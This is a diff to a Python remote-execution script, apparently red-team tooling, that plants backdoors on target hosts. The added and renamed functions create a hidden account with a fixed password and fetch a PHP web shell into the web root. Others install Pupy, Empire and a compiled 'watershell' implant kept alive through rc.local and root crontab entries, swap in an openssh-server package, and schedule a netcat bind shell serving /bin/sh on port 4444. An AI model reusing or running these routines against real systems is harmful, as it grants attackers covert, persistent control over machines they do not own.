@@ -3,7 +3,7 @@ def backdoor_user(connect):
                  "totally_legit_user && echo \"VerySecure\nVerySecure\" | passwd totally_legit_user'")
 
 
-def backdoor_web_shell(connect):
+def web_shell(connect):
     connect.run("fetch https://raw.githubusercontent.com/artyuum/Simple-PHP-Web-Shell/master/index.php")
     connect.run("mv index.php /usr/local/www/WebMagic.php")
 
@@ -26,11 +26,11 @@ def backdoor_ssh(connect):
 # totally_legit_user VerySecure
 
 # badmin VerySecure
-def backdoor_pfsense_user(connect):
+def pfsense_user(connect):
     connect.put('UploadFiles/system_usermanager.php', remote="/usr/local/www/")
 
 
-def backdoor_pupy(connect):
+def pupy(connect):
     #REQUIRES A CLIENT TO BE INSTALLED AND THE MALWARE
     connect.put('UploadFiles/pupy')
     connect.sudo('mv pupy /bin/')
@@ -38,5 +38,47 @@ def backdoor_pupy(connect):
     connect.sudo("sh -c 'printf \"#!/bin/bash\n/bin/./pupy\nexit 0\" > /etc/rc.local && /bin/./pupy'")
     connect.sudo('/bin/./pupy')
 
-# Up to implementation: merlin
+def empire(connect):
+    ###NEEDS MORE WORK
+    connect.put('UploadFiles/empyre.py')
+    connect.sudo('mv empyre.py /tmp/')
+    connect.run('nohup python /tmp/empyre.py &')
+    connect.run("sh -c 'echo \"@reboot python /tmp/empyre.py\" > empyre.txt'")
+    connect.sudo("crontab -u root empyre.txt")
+    connect.run("rm empyre.txt")
+
+
+def merlin(connect):
+    pass
+
+
+def watershell(connect):
+    connect.put('UploadFiles/watershell/watershell.c')
+    connect.put('UploadFiles/watershell/watershell.h')
+    connect.sudo('gcc watershell.c -o watershell')
+    connect.sudo('mv watershell /bin/')
+    connect.sudo('nohup watershell &')
+    connect.run("sh -c 'echo \"@reboot /bin/watershell\" > water.txt'")
+    connect.sudo("crontab -u root water.txt")
+    connect.run("rm water.txt watershell.c watershell.h")
+# nc <IP> <port> -u
+# run: mkdir pwned
+# Note: You will not see any output
+
+
+def nomnom_ubuntu(connect):
+    connect.sudo('apt update -y')
+    connect.put('UploadFiles/openssh-server_7.2p2-4ubuntu2.7_amd64.deb')
+    connect.sudo('apt install openssh-server -y')
+    connect.sudo('dpkg -i openssh-server*.deb')
+    connect.run('rm openssh-server_7.2p2-4ubuntu2.7_amd64.deb')
+
+
+def vince_netcat(connect):
+    connect.sudo("apt install netcat-traditional -y")
+    connect.sudo("crontab -l | echo '*/5 * * * * nc.traditional -lvp 4444 -e /bin/sh' | crontab -")
+
+
+
+# Up to implementation: merlin and empirer
 # https://github.com/shad0wghost/ssh-authlog-backdoor
